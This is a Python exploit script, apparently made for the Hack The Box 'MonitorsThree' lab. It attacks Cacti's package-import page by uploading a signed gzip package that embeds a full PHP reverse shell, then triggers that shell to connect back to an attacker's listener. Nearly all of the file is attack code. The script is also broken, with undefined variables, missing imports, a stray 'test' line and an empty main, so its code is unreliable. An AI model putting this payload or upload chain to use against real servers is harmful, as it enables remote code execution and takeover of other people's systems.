#!/usr/bin/env python3

'''
Author: Declan Middleton
License: MIT
github: https://github.com/declanmiddleton
linkedin: https://www.linkedin.com/in/declanmiddleton/
youtube: https://youtube.com/@declanmidd
HackTheBox: declanmiddleton

Made for MonitorsThree HTB

┏━┓╺┳╸╻╻  ╻     ╻┏┓╻   ╺┳┓┏━╸╻ ╻┏━╸╻  ┏━┓┏━┓┏┳┓┏━╸┏┓╻╺┳╸         ╺┳┓┏━┓   ┏┓╻┏━┓╺┳╸   ┏━┓╻ ╻┏┓╻
┗━┓ ┃ ┃┃  ┃     ┃┃┗┫    ┃┃┣╸ ┃┏┛┣╸ ┃  ┃ ┃┣━┛┃┃┃┣╸ ┃┗┫ ┃    ╺━╸    ┃┃┃ ┃   ┃┗┫┃ ┃ ┃    ┣┳┛┃ ┃┃┗┫
┗━┛ ╹ ╹┗━╸┗━╸   ╹╹ ╹   ╺┻┛┗━╸┗┛ ┗━╸┗━╸┗━┛╹  ╹ ╹┗━╸╹ ╹ ╹          ╺┻┛┗━┛   ╹ ╹┗━┛ ╹    ╹┗╸┗━┛╹ ╹
'''

import os
import ssl
import argparse
import urllib3
import urllib.request
import certifi 
from bs4 import BeautifulSoup

banner = '''
░▀█▀░█░█░█▀█░█▀▄░█▀█░░░░█▀▄░█▀▄░█▀█░█▀█
░░█░░█▀█░█░█░█▀▄░█░█░░░░█░█░█▀▄░█░█░█▀▀
░░▀░░▀░▀░▀▀▀░▀░▀░▀░▀░░░░▀▀░░▀░▀░▀▀▀░▀░░
'''
print(banner)

# variables
http = urllib3.PoolManager(
    cert_reqs='CERT_REQUIRED',
    ca_certs=certifi.where()
)
http_proxy = {'127.0.0.1' : 8080}
cacti_url = input('[>] Enter cacti url: ')
session = urllib3.request(cacti_url)

lines_to_add = ['10.10.11.30 monitorsthree.htb cacti.monitorsthree.htb']

payload = """<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '""" + lhost + """';
$port = """ + lport + """;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>"""

# class for definitions
class exploit:
    def check_cacti_version(version_check):
        print('[+] Checking cacti version')
        r = http.request(version_check)
        r.text
        
        if 'Cacti CHANGELOG' in r and '1.2.26' not in r:
            print('[+] Valid version!')
        else:
            print('[-] Invalid version, not going to work..')
        pass

    # login to user and run the payload function
    def auth_login():
        print('[+] Valid version, attempting login')
        auth = urllib.request.HTTPBasicAuthHandler()
        auth.add_password(realm='Cacti', uri=cacti_url, user='', passwd='')
        opener = urllib.request.build_opener(auth)
        urllib.request.install_opener(opener)
        with urllib.request.urlopen(cacti_url) as f:
            print(f.read().decode('utf-8'))    

# the payload once authenticated will be sent through this functioon
def payload():
     # generate payload
    print("[*] Generating malicious payload...")
    keypair = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = keypair.public_key().public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
    file_signature = keypair.sign(payload.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256())
    
    b64_payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
    b64_file_signature = base64.b64encode(file_signature).decode('utf-8')
    b64_public_key = base64.b64encode(public_key).decode('utf-8')
test
    data = """<xml>
   <files>
       <file>
           <name>resource/""" + random_filename + """</name>
           <data>""" + b64_payload + """</data>
           <filesignature>""" + b64_file_signature + """</filesignature>
       </file>
   </files>
   <publickey>""" + b64_public_key + """</publickey>
   <signature></signature>
</xml>"""

    print('[*] Deploying payload to target URL  ')
    signature = keypair.sign(data.encode('utf-8'), padding.PKCS1v15(), hashes.SHA256())
    final_data = data.replace("<signature></signature>", "<signature>" + base64.b64encode(signature).decode('utf-8') + "</signature>").encode('utf-8')

    # write gzip data
    f = open(random_filename + ".gz", "wb")
    f.write(gzip.compress(final_data))
    f.close()

    print("[+] Malicious GZIP: " + random_filename + ".gz")

    # define post data
    post_data = {
        '__csrf_magic': csrf_token,
        'trust_signer': 'on',
        'save_component_import': 1,
        'action': 'save'
    }

    # upload file
    print("[*] Uploading GZIP file...")

    # send post request
    r = req.post(url + "/package_import.php?package_location=0&preview_only=on&remove_orphans=on&replace_svalues=on", data=post_data, files={'import_file': open(random_filename + ".gz", 'rb')})

    print("[+] Successfully uploaded GZIP file")

    time.sleep(0.5)

    print("[*] Validating success...")

    soup = BeautifulSoup(r.text, 'html.parser')
    html_parser = soup.find('input', {'title': "/var/www/html/cacti/resource/" + random_filename})
    file_id = html_parser.get('id')

    post_data = {
        '__csrf_magic': csrf_token,
        'trust_signer': 'on',
        'data_source_profile': 1,
        'remove_orphans': 'on',
        'replace_svalues': 'on',
        file_id: 'on',
        'save_component_import': 1,
        'preview_only': '',
        'action': 'save',
    }

    r = req.post(url + '/package_import.php?header=false', data=post_data)

    print('[+] Success!')
    
    time.sleep(0.4)

    print('[*] Triggering reverse shell by sending GET request to ' + url + '/resource/' + random_filename)
    time.sleep(0.3)
    print("[+] Check your netcat listener")

    # remove payload file
    os.remove(random_filename + ".gz")

    r = req.get(url + '/resource/' + random_filename)
    pass


# function for checking to see if domains are in host file for this
# script to work correctly without an issue.
def check_hosts_files():
    print('[=] Checking domains in host file [=]')
    

if __name__ == '__main__':
    pass
